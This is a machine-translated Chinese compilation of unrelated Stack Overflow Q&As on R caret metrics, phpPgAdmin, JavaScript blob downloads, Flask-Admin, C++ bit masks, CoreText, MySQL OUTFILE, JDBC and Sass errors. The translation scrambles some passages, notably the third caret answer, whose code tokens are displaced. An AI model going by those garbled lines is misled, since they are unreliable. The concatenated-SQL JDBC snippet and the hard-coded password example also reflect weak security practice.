> ID：13548092
> 
> 赞同：15
> 
> 时间：2012-11-25T03:51:23.210
> 
> 标签：r, sentiment-analysis, confusion-matrix

是否有任何工具/R 包可用于计算 R 中混淆矩阵的准确性和精度？

[公式和数据结构在这里](http://www2.cs.uregina.ca/~dbd/cs831/notes/confusion_matrix/confusion_matrix.html)

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-09-20T10:29:29.027

[是的，您可以使用混淆矩阵](http://www.inside-r.org/node/86995)计算 R 中的 Accuracy 和precision 。它使用[Caret 包](http://cran.r-project.org/web/packages/caret/caret.pdf)。

这是示例：

```
lvs <- c("normal", "abnormal")
truth <- factor(rep(lvs, times = c(86, 258)),
                levels = rev(lvs))
pred <- factor(
               c(
                 rep(lvs, times = c(54, 32)),
                 rep(lvs, times = c(27, 231))),               
               levels = rev(lvs))

xtab <- table(pred, truth)
# load Caret package for computing Confusion matrix
library(caret) 
confusionMatrix(xtab) 
```

xtab**的混淆矩阵**是这样的：

```
Confusion Matrix and Statistics

          truth
pred       abnormal normal
  abnormal      231     32
  normal         27     54

               Accuracy : 0.8285
                 95% CI : (0.7844, 0.8668)
    No Information Rate : 0.75
    P-Value [Acc > NIR] : 0.0003097

                  Kappa : 0.5336
 Mcnemar's Test P-Value : 0.6025370

            Sensitivity : 0.8953
            Specificity : 0.6279
         Pos Pred Value : 0.8783
         Neg Pred Value : 0.6667
             Prevalence : 0.7500
         Detection Rate : 0.6715
   Detection Prevalence : 0.7645

       'Positive' Class : abnormal 
```

所以这里有你想要的一切。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2016-02-25T15:05:32.597

@Harsh Trivedi

**byClass**允许您从摘要中提取*精度*和*召回率。*PPV 是精确的。敏感性是回忆。[https://en.wikipedia.org/wiki/Precision_and_recall](https://en.wikipedia.org/wiki/Precision_and_recall)

```
library(caret)

result <- confusionMatrix(prediction, truth)
precision <- result$byClass['Pos Pred Value']    
recall <- result$byClass['Sensitivity'] 
```

我想你想提取精度和召回率来计算*f 度量*，所以就这样吧。

```
f_measure <- 2 * ((precision * recall) / (precision + recall)) 
```

我还发现了这个方便的在线计算器进行健全性检查。 [http://www.marcovanetti.com/pages/cfmatrix/?noc=2](http://www.marcovanetti.com/pages/cfmatrix/?noc=2)

-bg

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-04-25T20:42:17.023

如果有人遇到与我相同的问题，则该方法`confusionMatrix()`确实`caret`提供了敏感性/特异性。**但是**，如果它被输入一个类型的对象，`train`它将运行一个不同的方法，`confusionMatrix.train()`它**没有**这个信息。

解决方案是从对象（即和分别）手动将`data`和提供给方法。`reference``train``$pred$pred$``$pred$obs``confusionMatrix()`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-05-10T20:47:32.893

万一其他人正在寻找：感谢上面 BGA 的回答，我对如何读取`confusionMatrix()`输出有了更清楚的了解，并意识到您可以直接从输出中获取 F 测量值`result$ByClass`作为 F1。

```
 result$byClass
         Sensitivity          Specificity       Pos Pred Value       Neg Pred Value 
           0.9337442            0.8130531            0.8776249            0.8952497 
           Precision               Recall                   F1           Prevalence 
           0.8776249            0.9337442            0.9048152            0.5894641 
      Detection Rate Detection Prevalence    Balanced Accuracy 
           0.5504087            0.6271571            0.8733987 
```

`f_measure`使用与上述评论相同的公式计算下面也给出 0.9048152。

您还可以从`results$overall`

```
result$overall
      Accuracy          Kappa  AccuracyLower  AccuracyUpper   AccuracyNull AccuracyPValue 
  8.841962e-01   7.573509e-01   8.743763e-01   8.935033e-01   5.894641e-01   0.000000e+00 
 McnemarPValue 
  2.745521e-13 
```

或使用来自的平衡精度`results`

# ios - 由于“Ping 失败”，Frank 无法启动应用程序

> ID：13548093
> 
> 赞同：0
> 
> 时间：2012-11-25T03:52:14.957
> 
> 标签：ios, simulator, frank

弗兰克一直工作到上周。我有一个坦率的项目，现在我总是得到：

ping 失败！！！！！！！！！！

当场景来到“我启动应用程序”时。

这个项目的功能测试可以在别人的笔记本上通过。我再次检查项目，重新启动我的笔记本电脑。但它也失败了。并且项目可以在模拟器中成功运行。

另一件事是我尝试帮助坦率地启动模拟器。所以我在功能测试运行之前启动模拟器，但是当它执行“我启动应用程序”时，模拟器会退出。弗兰克无法启动模拟器......

我与这个问题斗争了好几天，很沮丧......希望有人能帮助我！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T12:28:43.150

在项目目录的 Frank/support 文件夹中，有一个 env.rb 文件，您需要编辑该文件以指定您使用的模拟器版本。您可能没有在您的机器上安装其他笔记本电脑安装的模拟器版本吗？

# ios - 多操作系统程序兼容性

> ID：13548095
> 
> 赞同：-1
> 
> 时间：2012-11-25T03:52:41.223
> 
> 标签：ios, linux, windows, ubuntu

是否可以创建与所有操作系统兼容的程序？如果不是，那么将其分解并配置为适合的最佳方法是什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:12:15.253

请查看 QT [http://doc.qt.digia.com/qt/supported-platforms.html](http://doc.qt.digia.com/qt/supported-platforms.html)但 iOS 不支持。

# postgresql - 如何登录到 phppgadmin

> ID：13548097
> 
> 赞同：3
> 
> 时间：2012-11-25T03:53:24.897
> 
> 标签：postgresql, pgadmin, phppgadmin

好的，

我使用 postgresql 的第一天。

我已经下载并安装了 postgresql（到 Windows），它要求我设置密码（比如：1234）。

然后我下载了 phppgadmin，并尝试登录到 pgadmin。

我试过了

```
root:1234

postgres:1234 
```

我无法登录并且还从 pgadmin 收到以下 php 错误

```
( ! ) Strict standards: Only variables should be assigned by reference in C:\wamp\www\phpPgAdmin-5.0.4\classes\database\Connection.php on line 23 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-30T15:18:46.527

尝试这个：

打开 C:\wamp\www\phpPgAdmin-5.0.4\classes\database\Connection.php 并删除第 23 行的 '&' 并尝试一下。您可能在第 14 行的 C:\wamp\apps\phpPgAdmin-5.0.4\redirect.php 中有另一个错误，然后替换

```
parse_str(value(url($url['url'], $url['urlvars']), $_REQUEST), $vars); 
```

经过

```
$href = url($url['url'], $url['urlvars']);

$val = value($href, $_REQUEST);

parse_str($val, $vars); 
```

瞧

# javascript - 使用纯 javascript 创建下载提示

> ID：13548102
> 
> 赞同：2
> 
> 时间：2012-11-25T03:55:02.807
> 
> 标签：javascript

我`var a = 'Hello World From Javascript';`在当前窗口的 javascript 变量中有一些文本数据（比如）。我想通过javascript执行以下操作-

```
1\. open a new window and write the text data to the window.
2\. set the content type to text/plain.
3\. set the content-disposition to attachment, so that download prompt comes.
4\. user downloads the text data as a text file and saves it to his local disk. 
```

这一切都可以通过javascript实现吗？

我知道我们可以对服务器进行 ajax 调用或重定向，但在这种情况下，而不是遵循上述步骤。但在这种情况下，这些变通办法是不适应的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-12-02T11:00:27.507

您可以使用 JS 和 HTML5 功能来做到这一点。请在下面找到示例代码。

```
 var fileParts = ['Hello World From Javascript'];

        // Create a blob object.
        var bb = new Blob(fileParts,{type : 'text/plain'});

        // Create a blob url for this. 
        var dnlnk = window.URL.createObjectURL(bb);

        var currentLnk = $('#blobFl').attr('href');

        // blobFl is the id of the anchor tag through which the download will be triggered.

        $('#blobFl').attr('href',dnlnk);
        $('#blobFl').attr('download','helloworld.txt');

        // For some reason trigger from jquery dint work for me.
        document.getElementById('blobFl').click(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-25T08:39:16.703

### 在没有任何服务器请求的情况下触发文件下载

不幸的是，这不是您使用普通浏览器功能可以做到的。flash 或特定于浏览器的插件之类的东西可以满足您的需求，但 javascript 中的安全限制不会让您下载在浏览器中创建的任意数据。

此外，并非所有浏览器/版本组合都支持“数据”网址。我不确定您的用户是否受限于他们使用的浏览器，但这可能会限制您可以使用该解决方案做什么。

### 来源：[在没有任何服务器请求的情况下触发文件下载](https://stackoverflow.com/questions/3358209/triggering-a-file-download-without-any-server-request)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-07-09T09:26:49.833

如果您已经在服务器上拥有该文件（我进行 ajax 调用以在服务器上生成并保存 PDF） - 您可以这样做

```
window.location.replace(fileUrl); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-25T03:59:37.583

不，Content-Disposition 是一个响应头，它必须来自服务器。我认为你可以用 Flash 来做，但我不推荐它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-03-25T16:06:14.903

[这是@Rajagopalan Srinivasan 答案](https://stackoverflow.com/a/20326653/237917)的干净、纯 js 版本：

```
var fileParts = ["Hello World From Javascript"];
// The anchor tag to use.
const blobLink = document.getElementById("blobLink");
// Create a blob object.
var blob = new Blob(fileParts, { type: "text/plain" });

// Create a blob url for this.
var blobUrl = window.URL.createObjectURL(blob);

blobLink.setAttribute("href", blobUrl);
blobLink.setAttribute("download", "helloworld.txt");
blobLink.click(); 
```

```
<a id="blobLink">Download</a> 
```

# flask-admin - Flask Admin 不显示所有字段

> ID：13548103
> 
> 赞同：3
> 
> 时间：2012-11-25T03:55:24.237
> 
> 标签：flask-admin, flask-extensions

我有这样的模型：

```
class User(db.Model):
    __tablename__ = 'users'
    __table_args__ = {'mysql_engine' : 'InnoDB', 'mysql_charset' : 'utf8'}
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True)
    email = db.Column(db.String(120), unique=True)
    _password = db.Column('password', db.String(80))

    def __init__(self, username = None, email = None, password = None):
        self.username = username
        self.email = email
        self._set_password(password)

    def _set_password(self, password):
        self._password = generate_password_hash(password)

    def _get_password(self):
        return self._password

    def check_password(self, password):
        return check_password_hash(self._password, password)

    password = db.synonym("_password", descriptor=property(_get_password, _set_password))

    def __repr__(self):
        return '<User %r>' % self.username 
```

我有模型视图：

```
class UserAdmin(sqlamodel.ModelView):
    searchable_columns = ('username', 'email')
    excluded_list_columns = ['password']
    list_columns = ('username', 'email')
    form_columns = ('username', 'email', 'password') 
```

但无论我做什么，当我编辑用户信息时，flask 管理员都没有显示**密码字段。**有什么办法吗？甚至只是为了编辑哈希码。

**更新**：[https ://github.com/mrjoes/flask-admin/issues/78](https://github.com/mrjoes/flask-admin/issues/78)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-25T14:18:40.700

它不起作用的原因 - Flask-Admin 无法弄清楚如何处理 SynonymProperty，因此它无法生成表单字段。

有一种方法可以让它立即工作：

```
class UserAdmin(sqlamodel.ModelView):
    searchable_columns = ('username', 'email')
    excluded_list_columns = ['password']
    list_columns = ('username', 'email')
    form_columns = ('username', 'email')

    def scaffold_form(self):
        form_class = super(UserAdmin, self).scaffold_form()
        form_class.password = wtf.TextField('Password')
        return form_class 
```

我推出了简单的修复程序，它增加了对 SynonymProperty 的支持，因此即使没有表单自定义它也可以工作。不幸的是，我正在添加 MongoDB 后端，所以我不能很快发布新版本。

以防万一，SynonymProperty 被 SQLAlchemy 0.7 及更高版本中的混合属性取代，Flask-Admin 应该支持这些属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-11T09:30:29.533

好多了：

```
from wtforms.fields import PasswordField

class UserAdmin(sqlamodel.ModelView):
    searchable_columns = ('username', 'email')
    excluded_list_columns = ['password']
    form_overrides = dict(password=PasswordField) 
```

# android - 使用 App Engine 更新应用程序中的数据库

> ID：13548104
> 
> 赞同：2
> 
> 时间：2012-11-25T03:55:31.540
> 
> 标签：android, google-app-engine, google-cloud-endpoints

我一直在阅读有关应用程序引擎的信息，但我仍然不知道在 android 应用程序中我能做什么和不能做什么。

基本上我想要做的是能够在云中创建/管理一个数据库，如果需要，应用程序可以下拉并更新本地数据库。创建和管理将由我在应用程序之外完成。

我对这一切知之甚少，因为我刚刚开始使用它，但我已经制作了一个应用程序，我只想向它添加这个功能。我从来没有写过任何类型的 Web 服务调用或任何东西，但我用它们来获取数据等

这可以做到吗？有什么教程可以帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:19:33.880

这应该有帮助：

[Google I/O 2011：Android + App Engine：开发者的梦想组合](http://www.youtube.com/watch?v=M7SxNNC429U)

[Google I/O 2012 - 为 Android、iOS 和 Web 构建移动应用引擎后端](http://www.youtube.com/watch?v=NU_wNR_UUn4)

# c++ - 这里的运算符 ~ 是什么？

> ID：13548112
> 
> 赞同：1
> 
> 时间：2012-11-25T03:56:46.010
> 
> 标签：c++

鉴于：

```
#define MATCHLESS_MODE          (DWORD)0x00000001   // 무적 상태
#define TRANSPARENT_MODE        (DWORD)0x00000002   // 투명 상태
#define ONEKILL_MODE            (DWORD)0x00000004   // 초필 상태
#define DONMOVE_MODE            (DWORD)0x00000008   // 움직이지 못하는 상태
#define SAYTALK_MODE            (DWORD)0x00000010   // 귓속말 못하는 상태
#define MATCHLESS2_MODE         (DWORD)0x00000020   // 무적 상태2 (데미지는 입지만 죽지는 않는다.)
#define NO_ATTACK_MODE          (DWORD)0x00000040   // 공격 못하는 상태
#define ITEM_MODE               (DWORD)0x00000080   // 아이템 못버리고 못집는 모드
#define COMMUNITY_MODE          (DWORD)0x00000100   // 길드, 파티, 친구, 개인간 거래, 개인상점 할수 없음
#define TALK_MODE               (DWORD)0x00000200   // 일반 말 못하는 상태
#define SHOUTTALK_MODE          (DWORD)0x00000400   // 외치기 못하는 상태
#define RECOVERCHAO_MODE        (DWORD)0x00000800   // 카오 극복 모드
#define FREEPK_MODE             (DWORD)0x00001000   // CTRL키 누름 없이 pk가능
#define PVPCONFIRM_MODE         (DWORD)0x00002000   // PVP거절 상태
#define QUERYSETPLAYERNAME_MODE (DWORD)0x00004000   // 캐릭터 명 변경 가능 모드
#define MODE_MAILBOX            (DWORD)0x00008000   // 읽지 않은 편지
class CFixedMode
{
private:
    DWORD m_dwMode;
public:
    CFixedMode()
    {
        m_dwMode = 0;   
    };
    ~CFixedMode(){};
    void            SetMode( DWORD dwMode )     { m_dwMode |= dwMode; }
    void            SetNotMode( DWORD dwMode )  { m_dwMode &= (~dwMode); }
    BOOL            IsMode( DWORD dwMode ) { return ( ( m_dwMode & dwMode ) == dwMode ) ? TRUE : FALSE; }
}; 
```

这部分是什么`m_dwMode &= (~dwMode)`意思？我不明白`~`

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-25T04:01:13.877

如果你的意思是 ~ 在

```
m_dwMode &= (~dwMode); 
```

然后是按位否定。它反转其唯一操作数的位。整个表达式的意思是 - 将`m_dwMode`那些位置上的位清零`dwMode`。

当您将 ~ 应用于 dwMode 时，它​​会反转 - 零位变为 1，反之亦然。然后将结果与 m_dwMode 进行按位与运算。现在，与一位的 AND 是一个微不足道的操作。另一方面，与零位的 AND 产生一个常数零。

给定上下文，该操作用于设置和清除模式位。我在代码片段中看到一堆位掩码 - MATCHLESS_MODE 只是位 0，TRANSPARENT_MODE 是位 1，依此类推。因此，您可以使用 SetMode() 设置 m_dwMode 中的各个位，并使用 SetNotMode() 清除它们。这些函数的参数将是 XXX_MODE 常量之一，或其中几个的 OR 组合。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-25T03:59:47.553

逐位否定。

```
1001 == ~0110 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-25T04:00:09.877

它是[按位补码](http://en.wikipedia.org/wiki/Bitwise_operation#NOT)。输入值的所有位都被翻转。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-11-25T04:02:28.760

~dwMode 是按位补码，这意味着 DWORD 中的每一位都被反转。

例如，00000000000000000000000000001010 变为 11111111111111111111111111110101，

所以整个操作会关闭在​​ dwMode 中设置的 m_dwMode 中的位

# objective-c - CTFrame 在边缘丢弃字形

> ID：13548113
> 
> 赞同：3
> 
> 时间：2012-11-25T03:56:50.280
> 
> 标签：objective-c, ios, core-text, truetype

我正在尝试使用 core-text 在我的 iOS 应用程序中使用自定义 TTF 字体（scheherazade）呈现阿拉伯语文本，这在大多数情况下都有效 - 但是 CTFrame 边缘的某些字形被丢弃。

当我调整框架大小以使丢弃的字形出现在框架内部时，它们会正确显示，这让我相信 CTFrameDraw 内部出现了问题。下面是我用来呈现阿拉伯语文本的代码：

```
CGContextRef context = UIGraphicsGetCurrentContext();

// Flip the coordinate system
CGContextSetTextMatrix(context, CGAffineTransformIdentity);
 CGContextTranslateCTM(context, 0, v.textFrame.size.height);
CGContextScaleCTM(context, 1.0, -1.0);

CGMutablePathRef path = CGPathCreateMutable(); //1
 CGPathAddRect(path, NULL, v.textFrame );

CGFloat minLineHeight = 60.0;
CGFloat maxLineHeight = 60.0;

CTTextAlignment paragraphAlignment = kCTRightTextAlignment;
CTLineBreakMode lineBrkMode = kCTLineBreakByWordWrapping;

CTParagraphStyleSetting setting[4] = {
{kCTParagraphStyleSpecifierAlignment, sizeof(CTTextAlignment), &paragraphAlignment},
{kCTParagraphStyleSpecifierMinimumLineHeight, sizeof(CGFloat), &minLineHeight},
{kCTParagraphStyleSpecifierMaximumLineHeight, sizeof(CGFloat), &maxLineHeight},
{kCTParagraphStyleSpecifierLineBreakMode, sizeof(CTLineBreakMode), &lineBrkMode}
};

CTParagraphStyleRef paragraphStyle = CTParagraphStyleCreate(setting, 4);
NSDictionary *attr        = [NSDictionary dictionaryWithObjectsAndKeys:
(id)v.arabicFont, (id)kCTFontAttributeName,
paragraphStyle, (id)kCTParagraphStyleAttributeName,
nil];

CFRelease(paragraphStyle);

NSAttributedString* attString = [[[NSAttributedString alloc]
initWithString:v.verseText attributes:attr] autorelease]; //2

CTFramesetterRef framesetter =
CTFramesetterCreateWithAttributedString((CFAttributedStringRef)attString); //3
CTFrameRef frame =
CTFramesetterCreateFrame(framesetter,
CFRangeMake(0, [attString length]), path, NULL);

CTFrameDraw(frame, context); //4

CFRelease(frame); //5
CFRelease(path);
CFRelease(framesetter); 
```

还附上了显示我面临的问题的屏幕截图。任何帮助将非常感激。谢谢。

无效：[http](http://stellarbeacon.com.au/invalid.png) ://stellarbeacon.com.au/invalid.png 有效：[http ://stellarbeacon.com.au/valid.png](http://stellarbeacon.com.au/valid.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-09T09:42:47.947

CoreText 中有一些与确定正确帧大小相关的错误。其中一些在 iOS 6 中已修复，例如[http://www.cocoanetics.com/2012/02/radar-coretext-line-spacing-bug/](http://www.cocoanetics.com/2012/02/radar-coretext-line-spacing-bug/)

如果您的问题仍然存在，那么您应该向雷达提交详细信息。此外，您应该使用 Apple DTS 拨打电话，这可能会为您提供解决方法。通常——如果你的问题确实是一个错误——那么你的 DTS 呼叫就会被退回。

PS：尝试使用我的 DTCoreText 视图显示您的文本，这些视图进行手动布局和显示，看看是否可以在那里重现问题。如果没有，那么你有你的解决方法。

# mysql - 我可以使用变量在mysql中指定OUTFILE吗

> ID：13548118
> 
> 赞同：19
> 
> 时间：2012-11-25T03:59:11.780
> 
> 标签：mysql, sql, variables

有没有办法做类似下面的事情？这不起作用，但显示了我想要做的事情

```
SET @OutputPath = '/Users/jo/Documents'
SET @fullOutputPath = CONCAT(@OutputPath,'/','filename.csv')
SET @fullOutputPath2 = CONCAT(@OutputPath,'/','filename2.csv')

SELECT * INTO OUTFILE @fullOutputPath
FIELDS TERMINATED BY ',' 
OPTIONALLY ENCLOSED BY '"'
FROM database.tableName;

SELECT * INTO OUTFILE @fullOutputPath2
FIELDS TERMINATED BY ',' 
OPTIONALLY ENCLOSED BY '"'
FROM database.tableName2; 
```

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-11-25T08:21:33.300

**编辑：**将数据（例如表格）保存到文件中而不使用变量（仅常量值）

```
-- folder_path could could be like => c:/users/sami
-- choose the directory/folder already available in system
-- and make sure you have access to write the file there

SELECT * INTO OUTFILE 'folder_path/filename.csv'
FIELDS TERMINATED BY ',' 
OPTIONALLY ENCLOSED BY '"'
FROM database.tableName; 
```

现在**使用变量**

无论何时必须在 sql 中使用变量名，都需要动态 sql（仅适用于存储过程，既不适用于简单的 sql 查询，也不适用于触发器或函数）

```
SET @OutputPath := 'Users/jo/Documents'; //or any folder_path
SET @fullOutputPath := CONCAT(@OutputPath,'/','filename.csv');
SET @fullOutputPath2 := CONCAT(@OutputPath,'/','filename2.csv');

set @q1 := concat("SELECT * INTO OUTFILE ",@fullOutputPath,
" FIELDS TERMINATED BY ',' 
OPTIONALLY ENCLOSED BY '\"'
FROM database.tableName");

set @q2 := concat("SELECT * INTO OUTFILE ",@fullOutputPath2,
" FIELDS TERMINATED BY ',' 
OPTIONALLY ENCLOSED BY '\"'
FROM database.tableName2");

prepare s1 from @q1;
execute s1;deallocate prepare s1;

prepare s1 from @q2;
execute s1;deallocate prepare s1; 
```

正如您已经在查询中拥有两者一样`'`，`"`因此我使用并使用 \ 来连接您的查询`"`以转义您的原始`"`字符，以确保其用作文字字符而不用于连接

**我刚才讲了`variable`in sql的使用。首先，您应该确保您的查询是否像顶部的示例一样工作**（不使用变量）

**结论：**如果您的上述查询工作正常，那么考虑到您在某些存储过程中使用它，我告诉的动态 sql 也可以正常工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-15T08:57:27.700

我的卡玛很低，所以我发布的答案应该作为对 Sami 帖子的评论 - 您需要用引号将文件名括起来（注意在 @fullOutputPath 之前和之后添加 '）：

```
set @q1 := concat("SELECT * INTO OUTFILE '",@fullOutputPath,
"' FIELDS TERMINATED BY ',' 
OPTIONALLY ENCLOSED BY '\"'
FROM database.tableName"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-11-04T17:42:44.403

如果您想从 bash 中执行此操作，即将 csv 中的 mysql 中的一些数据导出到具有动态名称的文件中，它可能更容易且更具可读性，如下所示。

带有嵌入式 bash 变量的 SQL：

```
where (e.timestamp >= ${begin_ts} and e.timestamp < ${end_ts}) order by ed.timestamp ASC ) a
INTO OUTFILE '${export_path}' FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n'; 
```

以及运行 sql 文件的 bash 脚本。请注意评估 sql 脚本并替换变量的 envsubst 命令。

```
#!/bin/bash
mysql_db="dbname"
mysql_user="mysqlpass"
mysql_pass="password"
export_path="./data.csv"
begin_ts="1478278490"
current_ts=$(date +%s -u)

sql=`export_path=${export_path} begin_ts=${last_ts} end_ts=${current_ts} envsubst < export.sql`
mysql $mysql_db -u $mysql_user -p$mysql_pass -e"${sql}" 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-25T04:08:53.820

您不能在 mysql CLI 中执行此操作，但以这种方式可以工作

```
mysql -e "SELECT * FROM database.tableName;" -u user -p database > filename.csv 
```

# java - MySQL 命令 SELECT 列中的值 - JDBC

> ID：13548119
> 
> 赞同：0
> 
> 时间：2012-11-25T03:59:12.927
> 
> 标签：java, mysql, sql, database, jdbc

我通过 JDBC (Java) 使用 MySQL 命令来更改我的数据库。我已经实现了以下方法来返回列的值。目标是使列（行）中的位置与它们在数组中的位置（索引）相对应。这适用于字符串列，但对于数字列，ResultSet 似乎将它们按升序排列，从而使它们在返回的字符串数组中的位置不反映它们在列中的位置。'rs' 是 ResultSet 引用变量。

```
public String[] getColumnContents(String tableName, String columnName) {
    String sql = "SELECT " + columnName + " FROM " + tableName;
    String[] results = new String[SQLManager.getColumnLength(tableName, columnName)];

    try {
       rs = statement.executeQuery(sql);

       for (int counter = 0; rs.next(); counter++) {
            results[counter] = rs.getString(columnName);
       }

    } catch (SQLException e) {
       e.printStackTrace();
    }

    return results;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T04:16:44.980

就像在 SQL 命令中添加 ORDER BY 子句一样简单。这是我的工作方法：

```
public String[] getColumnContents(String tableName, String columnName) {
String sql = "SELECT " + columnName + " FROM " + tableName + " ORDER BY " + columnName1 + " ASC, " + columnName2 + " ASC";

String[] results = new String[SQLManager.getColumnLength(tableName, columnName)];

try {
    rs = statement.executeQuery(sql);

    for (int counter = 0; rs.next(); counter++) {
        results[counter] = rs.getString(columnName);
    }
} catch (SQLException e) {
    e.printStackTrace();
}

return results;

} 
```

# cocoa-touch - 无法记录 NSMutableDictionary 的描述

> ID：13548121
> 
> 赞同：1
> 
> 时间：2012-11-25T03:59:30.853
> 
> 标签：cocoa-touch, cocoa, nsdictionary, nsmutabledictionary

我有一个 NSMutableDictionary ，其中包含一到四个对象。每个包含的对象都是一个 NSDictionary。第一个字典包含大约 83,000 个对 NSManagedObjects 的引用。第二本词典包含大约 14,000 个相同类型的对象。

在下面的代码中，NSLog 语句中没有发生任何事情。就好像跳过了一样，程序继续运行。但是，不久之后我在使用这些词典时遇到了其他问题。我认为首先清理这个可能会对其他问题有所了解。

```
pos = @"v";
NSLog(@"%@", pos);
[request setEntity:[NSEntityDescription entityForName:@"SYNSET" inManagedObjectContext:[ManagedObjectContext moc]]];
predicate = [NSPredicate predicateWithFormat:@"partOfSpeech = %@", pos];
[request setPredicate:predicate];
sortDescriptor = [[NSSortDescriptor alloc] initWithKey:@"synsetOffset" ascending:YES];
[request setSortDescriptors:[NSArray arrayWithObject:sortDescriptor]];
synsetsArrayForPos = [[ManagedObjectContext moc] executeFetchRequest:request error:&error];
synsetDictionaryMutableForPos = [[NSMutableDictionary alloc] initWithCapacity:100000];
for (SYNSET *synset in synsetsArrayForPos)
    [synsetDictionaryMutableForPos setObject:synset forKey:[NSString stringWithFormat:@"%@",synset.synsetOffset]];
[dictionaryMutableOfSynsetDictionaries setObject:[NSDictionary dictionaryWithDictionary:synsetDictionaryMutableForPos] forKey:pos];

NSLog(@"dictionaryMutableOfSynsetDictionaries is class of %@ with description %@", [dictionaryMutableOfSynsetDictionaries class], [dictionaryMutableOfSynsetDictionaries description]);

pos = @"a";
NSLog(@"%@", pos); 
```

我用不同的值重复此代码四次，`pos`每次打印顶级`dictionaryMutableOfSynsetDictionaries`字典描述的 NSLog 都无法打印。如果我用字符串常量替换 `[dictionaryMutableOfSynsetDictionaries description]'，它会打印出来。

这里发生了什么？这是预期的行为还是我做错了什么？

（这段代码，加上大字典，是用来完成大型sqlite数据库的关系链接的，它不会用于可部署代码。我只在iOS模拟器上运行它。我会把更新的完成此更新后，我的应用程序包中的数据库。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T06:14:56.960

现在我看到了可能发生的事情，但它并没有完全回答为什么它没有打印到控制台。

NSDictionary 的 description 方法返回一个表示字典内容的字符串，格式为属性列表。对于这么大的字典，它会记录全部内容，大约有 100,000 条记录。

当我这样做`po [[dictionaryMutableOfSynsetDictionaries description] substringToIndex:1000]`时，它将显示前 1000 个字符。如果我不以这种方式缩短它，则组合字符串需要一段时间，然后需要永远呈现到控制台。

我确实在问题行之前和之后使用日志语句确认我的问题中的日志语句没有打印，而之前和之后的日志被打印。所以 NSLog 把它扔掉了，我想。

# html - 当我尝试从 Sublime text 2 编译时，我的 sass 没有编译？

> ID：13548124
> 
> 赞同：0
> 
> 时间：2012-11-25T03:59:51.523
> 
> 标签：html, css, sass, compass-sass, scout-sass

我已经安装了 Ruby 和[http://mhs.github.com/scout-app/](http://mhs.github.com/scout-app/)来编译 sass 文件。在 sublime text 2 中，我创建了一个文件并尝试编写样式表。

它不适合我。

如这篇文章[http://screencasts.org/episodes/introduction-to-sass](http://screencasts.org/episodes/introduction-to-sass)所示，我在编辑器中编写代码。

```
#sidebar_ad {
  display: block;
  width: 250px;
  height: 150px; } 
```

这对我不起作用。有人帮助我如何编译它。这是错误

```
/*
Syntax error: Invalid CSS after "#sidebar_ad": expected selector, was "{"
        on line 1 of C:/test/style.sass

1: C:/test/style.sass

Backtrace:
C:/UniServer/www/test/content/style.sass:1
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/scss/parser.rb:1129:in `expected'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/scss/parser.rb:1066:in `expected'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/scss/static_parser.rb:21:in `parse_selector'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/perform.rb:310:in `visit_rule'
org/jruby/RubyKernel.java:2096:in `send'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/base.rb:37:in `visit'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/perform.rb:98:in `visit'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/base.rb:53:in `visit_children'
org/jruby/RubyArray.java:2336:in `collect'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/base.rb:53:in `visit_children'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/perform.rb:107:in `visit_children'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/perform.rb:119:in `with_environment'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/perform.rb:106:in `visit_children'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/base.rb:37:in `visit'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/perform.rb:126:in `visit_root'
org/jruby/RubyKernel.java:2096:in `send'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/base.rb:37:in `visit'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/perform.rb:98:in `visit'
